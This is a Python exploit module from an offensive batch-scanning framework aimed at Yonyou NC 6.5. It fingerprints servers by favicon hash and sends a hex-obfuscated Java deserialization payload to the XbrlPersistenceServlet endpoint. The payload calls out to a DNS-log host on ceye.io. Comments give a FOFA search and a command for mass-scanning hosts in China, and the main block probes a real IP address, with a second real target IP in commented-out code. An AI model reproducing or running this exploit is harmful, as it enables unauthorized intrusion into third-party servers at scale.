# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

import hashlib

from colorama import Fore
from tqdm import tqdm

from core.MyGlobalVariableManager import GlobalVariableManager
from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: 用友 && country="CN"
# python batch.py -m exploit.web.OA.Yonyou.deserialize_XbrlPersistenceServlet_rce -cs -fs "\"用友\" && country=\"CN\""

class Script(BaseScript):
    name = 'Yonyou'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/logo/images/ufida.ico']
        # exec
        self.execPathList = ['/service/~xbrl/XbrlPersistenceServlet']
        # session
        self.session = session
        # 相关信息
        self.info = 'version NC 6.5'
        self.favicon = ['a5dccf6af79f420f7ea2f2becb6fafa5']

    async def detect(self):
        try:
            checkList = GlobalVariableManager.getValue('exploitRule')[self.name]
            for checkTarget in checkList:
                if self.target == checkTarget:
                    tqdm.write(Fore.RED + '[{}] detect method skip...'.format('E-Weaver Finger'))
                    # 如果存在的话，那么当前这个target的框架已经探测完毕了，
                    # 就没必要再次探测，所以直接进入exec方法中，唯一需要变动的就是flag=True
                    self.flag = True
                    return None
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                checkList.append(self.target)
                                tqdm.write(Fore.RED + '[{}] {}'.format('Yongyou Finger', url))
                                return {'name': 'Yongyou Finger', 'url': url, 'software': 'Yongyou'}
        except Exception:
            return None

    async def exec(self):
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                dnslog = "\x72\x63\x65\x2e\x30\x77\x74\x70\x73\x67\x2e\x63\x65\x79\x65\x2e\x69\x6f"
                data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x03\x4c\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x03\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x03\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x03\x78\x70\xff\xff\xff\xff\x00\x00\x00\x50\x74\x00\x11" + dnslog + "\x3a\x38\x30\x74\x00\x00\x74\x00\x0e" + dnslog + "\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x18\x68\x74\x74\x70\x3a\x2f\x2f" + dnslog + "\x3a\x38\x30\x78"
                async with self.session.post(url=url, headers=self.headers, data=data, timeout=self.reqTimeout, verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        # print(text)
                        tqdm.write(Fore.RED + '[{}] {}'.format('Yongyou RCE', url))
                        return {'name': 'Yongyou RCE', 'url': url, 'software': 'Yongyou'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)

    # sem = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())
